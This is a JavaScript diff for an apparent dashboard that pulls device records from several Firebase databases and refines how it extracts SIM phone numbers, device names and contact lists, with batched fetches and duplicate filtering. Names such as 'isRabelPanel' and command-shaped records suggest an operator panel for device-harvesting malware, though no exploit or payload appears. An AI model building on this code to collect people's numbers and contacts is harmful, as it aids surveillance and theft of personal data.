@@ -617,7 +617,12 @@ function shouldPreferPhone(existing,existingNode,incomingNode){
 function extractDevicePhone(raw,ctx){
   ctx=ctx||{};
   if(!raw||typeof raw!=='object')return'';
-  if(ctx.node==='clients'&&recordHasCommandShape(raw))return'';
+  var node=ctx.node||'';
+  if(node==='user_list'){
+    var listed=parseDevicePhone(raw.phone_number)||parseDevicePhone(raw.mobNo)||parseDevicePhone(raw.phone)||parseDevicePhone(raw.mobile);
+    if(listed)return listed;
+  }
+  if(node==='clients'&&recordHasCommandShape(raw))return'';
   var cmd=recordHasCommandShape(raw);
   var tryKeys=function(obj,keys){
     var i,p;
@@ -632,6 +637,10 @@ function extractDevicePhone(raw,ctx){
   if(p)return p;
   if(!cmd){
     p=tryKeys(raw,DEVICE_SIM_FALLBACK_KEYS);
+    if(p)return p;
+  }
+  if(raw.device&&typeof raw.device==='object'){
+    p=tryKeys(raw.device,DEVICE_SIM_PHONE_KEYS.concat(DEVICE_SIM_FALLBACK_KEYS));
     if(p)return p;
   }
   var nests=['device_info','live_data','deviceInfo','liveData','info','profile','sim_info','simInfo','sim_data','SimInfo'];
@@ -659,17 +668,10 @@ function extractDevicePhone(raw,ctx){
 }
 function getDeviceDisplayPhone(s,devId){
   if(!s)return'No Number';
-  if(s.mobNo&&s._phoneSource==='user_list')return parseDevicePhone(s.mobNo)||'No Number';
-  if(s.mobNo&&s._phoneSource==='user_data'&&!recordHasCommandShape(s))return parseDevicePhone(s.mobNo)||'No Number';
-  if(s.mobNo){
-    var parsed=parseDevicePhone(s.mobNo);
-    if(parsed&&s._phoneSource!=='clients')return parsed;
-    if(parsed&&s._phoneSource==='clients'&&!recordHasCommandShape(s))return parsed;
-  }
-  var fallback=extractDevicePhone(s,{devId:devId||s._devId,node:s._node||''});
-  if(fallback)return fallback;
-  if(devId&&isHexDeviceKey(devId))return devId.slice(0,8)+'…';
-  if(s._devId&&isHexDeviceKey(s._devId))return s._devId.slice(0,8)+'…';
+  var p=parseDevicePhone(s.mobNo);
+  if(p)return p;
+  p=extractDevicePhone(s,{devId:devId||s._devId,node:s._node||''});
+  if(p)return p;
   return'No Number';
 }
 function isRabelPanel(inst){
@@ -1402,22 +1404,44 @@ function buildDeviceStub(raw,devId,node,fbId){
     _node:node||'user_data',_fbId:fbId||raw._fbId||'',_devId:devId
   };
 }
+function applyUserListPhones(inst,raw){
+  if(!inst||!raw||typeof raw!=='object')return;
+  inst.userListCache=raw;
+  Object.keys(raw).forEach(function(devId){
+    if(!isHexDeviceKey(devId)||!raw[devId]||typeof raw[devId]!=='object')return;
+    var phone=extractDevicePhone(raw[devId],{devId:devId,node:'user_list'});
+    if(!phone)return;
+    var key=makeDevKey(inst.id,devId), rec=clientsRawMap[key]||{};
+    rec.mobNo=phone;
+    rec._phoneSource='user_list';
+    rec._node='user_list';
+    rec._fbId=inst.id;
+    rec._devId=devId;
+    if(!rec.name||rec.name==='Unknown'){
+      rec.name=String(raw[devId].d_name||raw[devId].name||'Device').slice(0,48);
+    }
+    clientsRawMap[key]=rec;
+  });
+}
 function ingestDeviceData(fbId,node,devId,data){
   var wrapped=Object.assign({_fbId:fbId,_devId:devId,_nodeName:node},data||{});
   var norm=normalizeClientRecord(wrapped,devId,node);
   if(!norm&&devId&&isHexDeviceKey(devId))norm=buildDeviceStub(wrapped,devId,node,fbId);
   if(!norm)return;
+  if(node==='clients'&&recordHasCommandShape(data||{}))norm.mobNo='';
   norm._node=node;norm._fbId=fbId;norm._devId=devId;
   var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
-  if(node==='clients'&&recordHasCommandShape(data||{}))norm.mobNo='';
-  if(norm.mobNo&&!shouldPreferPhone(existing,existing._node,node))norm.mobNo=existing.mobNo||'';
   if(existing._phoneSource==='user_list'&&existing.mobNo){
     norm.mobNo=existing.mobNo;
-    norm._phoneSource=existing._phoneSource;
-  }else if(existing._phoneSource==='user_data'&&existing.mobNo&&node!=='user_list'){
+    norm._phoneSource='user_list';
+    norm._node='user_list';
+  }else if(norm.mobNo&&!shouldPreferPhone(existing,existing._node,node)){
+    norm.mobNo=existing.mobNo||norm.mobNo;
+    if(existing._phoneSource)norm._phoneSource=existing._phoneSource;
+  }else if(!norm.mobNo&&existing.mobNo){
     norm.mobNo=existing.mobNo;
-    norm._phoneSource=existing._phoneSource;
-  }else if(!norm.mobNo&&existing.mobNo)norm.mobNo=existing.mobNo;
+    if(existing._phoneSource)norm._phoneSource=existing._phoneSource;
+  }
   if((!norm.name||norm.name==='Unknown')&&existing.name&&existing.name!=='Unknown')norm.name=existing.name;
   var foundContacts=extractContactsFromRecord(data);
   if(foundContacts.length)norm.contacts=mergeContacts(existing.contacts,foundContacts);
@@ -1439,27 +1463,34 @@ function getPhoneEnrichNodes(inst){
 }
 function enrichPhonesFromUserList(inst){
   if(!inst||!inst.restUrl)return Promise.resolve();
-  var tasks=[], batch=0, maxBatch=60;
-  Object.keys(clientsRawMap).forEach(function(mapKey){
-    var p=parseDevKey(mapKey);
-    if(p.fbId!==inst.id||batch>=maxBatch)return;
-    var rec=clientsRawMap[mapKey];
-    if(rec.mobNo&&rec._phoneSource==='user_list')return;
-    batch++;
-    tasks.push(
-      restJsonInst(inst,'user_list/'+p.devId).then(function(data){
+  if(inst.userListCache){
+    applyUserListPhones(inst,inst.userListCache);
+    processClientsData();
+    return Promise.resolve();
+  }
+  var keys=Object.keys(clientsRawMap), tasks=[], i=0, chunk=80;
+  function runBatch(start){
+    var slice=keys.slice(start,start+chunk);
+    if(!slice.length)return Promise.resolve();
+    var batchTasks=slice.map(function(mapKey){
+      var p=parseDevKey(mapKey);
+      if(p.fbId!==inst.id)return Promise.resolve();
+      var rec=clientsRawMap[mapKey];
+      if(rec.mobNo&&rec._phoneSource==='user_list')return Promise.resolve();
+      return restJsonInst(inst,'user_list/'+p.devId).then(function(data){
         if(!data||typeof data!=='object'||isFirebaseErr(data))return;
         var phone=extractDevicePhone(data,{devId:p.devId,node:'user_list'});
         if(!phone)return;
         rec.mobNo=phone;
         rec._phoneSource='user_list';
-        rec._node=rec._node||'user_list';
+        rec._node='user_list';
+        if((!rec.name||rec.name==='Unknown')&&data.d_name)rec.name=String(data.d_name).slice(0,48);
         clientsRawMap[mapKey]=rec;
-      }).catch(function(){})
-    );
-  });
-  if(!tasks.length)return Promise.resolve();
-  return Promise.all(tasks).then(function(){processClientsData();});
+      }).catch(function(){});
+    });
+    return Promise.all(batchTasks).then(function(){return runBatch(start+chunk);});
+  }
+  return runBatch(0).then(function(){processClientsData();});
 }
 function enrichFromAllNodes(inst){
   var roots=getPhoneEnrichNodes(inst), keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=24;
@@ -1507,6 +1538,8 @@ function enrichFromUserList(inst){
 }
 function mergeSummaryNode(fbId,node,raw){
   if(!raw||typeof raw!=='object')return;
+  var inst=getFbInstance(fbId);
+  if(node==='user_list'&&inst)applyUserListPhones(inst,raw);
   Object.keys(raw).forEach(function(k){
     if(!raw[k])return;
     if(typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);
@@ -1607,22 +1640,24 @@ function orderDeviceNodes(nodes){
 }
 function sanitizeBroadcastPhones(inst){
   if(!inst)return;
-  var counts={}, keys=Object.keys(clientsRawMap), i, k, p, rec, phone;
+  var counts={}, keys=Object.keys(clientsRawMap), mapKey, p, rec, phone;
   keys.forEach(function(mapKey){
     p=parseDevKey(mapKey);
     if(p.fbId!==inst.id)return;
     rec=clientsRawMap[mapKey];
     if(!rec||!rec.mobNo||rec._phoneSource==='user_list')return;
+    if(rec._phoneSource&&rec._phoneSource!=='clients')return;
     phone=parseDevicePhone(rec.mobNo);
     if(!phone)return;
     if(!counts[phone])counts[phone]=[];
     counts[phone].push(mapKey);
   });
   Object.keys(counts).forEach(function(phone){
-    if(counts[phone].length<5)return;
+    if(counts[phone].length<8)return;
     counts[phone].forEach(function(mapKey){
       var rec=clientsRawMap[mapKey];
       if(!rec||rec._phoneSource==='user_list')return;
+      if(rec._phoneSource&&rec._phoneSource!=='clients')return;
       rec.mobNo='';
       rec._phoneSource='';
       clientsRawMap[mapKey]=rec;
